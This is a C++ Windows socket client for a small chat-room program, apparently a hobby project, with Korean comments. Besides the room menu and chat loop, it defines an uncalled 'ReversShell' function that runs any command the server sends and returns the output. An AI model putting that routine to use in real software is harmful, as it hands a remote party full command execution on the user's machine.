#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>

#include <thread>
using namespace std;

#pragma comment(lib, "Ws2_32.lib")


#define PORT 7777
#define PACKET_SIZE 1024
#define SERVER_IP "192.168.0.27"

#define NAME_LEGNTH 24

SOCKET hSocket;
SOCKADDR_IN tAddr={};
char cBuffer[PACKET_SIZE] = {};
char name[NAME_LEGNTH];



void proc_recv(){
	 //char 생성
	//string cmd; //string 생성
    int rResult=0;
	while(!WSAGetLastError()){
		ZeroMemory(&cBuffer,PACKET_SIZE);
		rResult=recv(hSocket, cBuffer, PACKET_SIZE,0); 
        if(rResult==SOCKET_ERROR || rResult==0){
            printf("error %d\n",rResult);
            break;
        }
        //if(!strcmp(cBuffer,"/q")) break;
		//cmd=buffer; //buffer의값이 cmd에 들어갑니다
		//if(cmd=="hi") break; //cmd의값이 "exit"일경우 데이터받아오기'만' 종료
		printf("%s\n", cBuffer);
	}
}
void Chat(){
    
    //char idx[]="1";
    //send(hSocket, idx, strlen(idx),0);
    cout<<"<<Chat Mode>>\n\n";
    //==chat====
    char msg[PACKET_SIZE]={};

    thread chat(proc_recv);
    while(!WSAGetLastError()){
        /*
        int tasknum=0;
        cout<<"1 room list\n2 room create\n0 quit\n\n>> ";
       cin>>tasknum;
        if(tasknum==1) Chat();
        else if(tasknum==2) ReversShell();
        else if(tasknum==0) {
            char idx[]="0";
            send(hSocket, idx, strlen(idx),0);
            cout<<"quit/n/n";
            break;
        }
        else cout<<"worng number!=n";
        */
        cin.getline(msg,PACKET_SIZE,'\n');

        
        send(hSocket, msg, strlen(msg),0); 
        if(!strcmp(msg,"/q")) {
            //cout<<"chat exit\n";
            break;
        }
    }
    chat.join();
    cout<<"chat exit\n";
    
}

void ReversShell(){
    char idx[]="2";
    send(hSocket, idx, strlen(idx),0);
    cout<<"<<ReversShell>>\n\n";
    char buff[PACKET_SIZE] = {0},rev[10000] = {0};
    //cout << "success connecting to server(IP >> " << inet_ntoa(tAddr.sin_addr) << ")" << endl;
    while(!WSAGetLastError()){
        //system("cls");
        ZeroMemory(buff,PACKET_SIZE);
        ZeroMemory(rev,10000);
        recv(hSocket,buff,PACKET_SIZE,0); //실행할 명령어받기
        if(!strcmp(buff,"/q")) {
            break;
        }
        FILE *fp=_popen(buff, "r"); //popen()함수로 명령어 출력결과를 읽기
        while(fgets(buff, PACKET_SIZE, fp) != NULL) strcat(rev,buff);
        //fp의 내용을 한줄한줄 끝날때까지 읽어와 buff의내용에 한줄한줄저장하면서 rev에 추가
        cout<<rev<<endl;
        
        _pclose(fp);
        
        send(hSocket,rev,sizeof(rev),0);
    }

}


int main() {

    char name[100]={};

    WSADATA wsaData;
    int iResult;
    

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        cout <<"WSAStartup failed: "<< iResult<<endl;
        return 1;
    }

    
    hSocket=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    
    tAddr.sin_family=AF_INET;
    tAddr.sin_port=htons(PORT);
    tAddr.sin_addr.s_addr=inet_addr(SERVER_IP);
    while(1) if(!connect(hSocket,(SOCKADDR*)&tAddr, sizeof(tAddr))) break;
    cout << "success connecting to server(IP >> " << inet_ntoa(tAddr.sin_addr) << ")\n" << endl;
    cout<<"name: ";
    cin.getline(name,NAME_LEGNTH,'\n');
    send(hSocket, name, strlen(name),0);

    char tasknum;
    char roomName[100];
    char buff[PACKET_SIZE];
    int rResult=0;
    int sResult=0;
    while(1){
        
        ZeroMemory(&buff,PACKET_SIZE);

        cout<<"\n1 room list\n2 room create\n3 enter room\n0 quit\n\n>> ";
        cin.getline(buff,PACKET_SIZE,'\n');
        sResult=send(hSocket, buff, PACKET_SIZE,0);
        if(sResult==SOCKET_ERROR || sResult==0){
                printf("error %s\n",WSAGetLastError());
                break;
        }
        ZeroMemory(&buff,PACKET_SIZE);
        rResult=recv(hSocket,buff,PACKET_SIZE,0);
        if(rResult==SOCKET_ERROR || rResult==0){
            printf("error %s\n",WSAGetLastError());
            break;
        }
        printf("packet success %s\n",buff);
        //cin.ignore();
        tasknum=buff[0];
        ZeroMemory(&buff,PACKET_SIZE);
        
        if(tasknum-48==1) {
            printf("<<room list>>\n");
            /*sResult=send(hSocket, &tasknum, PACKET_SIZE,0);
            if(sResult==SOCKET_ERROR || sResult==0){
                printf("error %s\n",WSAGetLastError());
                break;
            }*/
 
            
            rResult=recv(hSocket,buff,PACKET_SIZE,0);
            if(rResult==SOCKET_ERROR || rResult==0){
                printf("error %s\n",WSAGetLastError());
                break;
            }

            printf("%s\n",buff);

        }
        else if(tasknum-48==2) {
            ZeroMemory(&roomName,100);
            printf("<<create room>>\nroom name: ");
            cin>>roomName;
            cin.ignore();
            cin.clear();
            sResult=send(hSocket, roomName, 100,0);
            if(rResult==SOCKET_ERROR || rResult==0){
                printf("error %s\n",WSAGetLastError());
            break;
        }
        }
        else if(tasknum-48==3) {
            //enter room
            ZeroMemory(&buff,PACKET_SIZE);
            printf("<<enter room>>\nroom number: ");
            cin>>buff;
            cin.ignore();
            cin.clear();

            send(hSocket, buff, 2,0);
            ZeroMemory(&buff,PACKET_SIZE);
            rResult=recv(hSocket,buff,PACKET_SIZE,0);
            if(rResult==SOCKET_ERROR || rResult==0){
                printf("error %s\n",WSAGetLastError());
                break;
            }
            if(!strcmp(buff,"0")){
                printf("!enter room error\n\n");
            }
            else if(!strcmp(buff,"1")){
                printf("erter room success. room num: %c\n\n",buff[0]);
            }

        }
        else if(tasknum-48==0) {
            //char idx[]="0";
            //send(hSocket, idx, strlen(idx),0);
            cout<<"quit/n/n";
            break;
        }
        else cout<<"worng number!\n";
        
        //cin.getline(msg,PACKET_SIZE);
        
       //send(hSocket, msg, strlen(msg),0); 
        /*if(!strcmp(msg,"/q")) {
            //cout<<"chat exit\n";
            break;
        }*/
    }

/*
    
    */
    closesocket(hSocket);

    WSACleanup();
    
    return 0;
}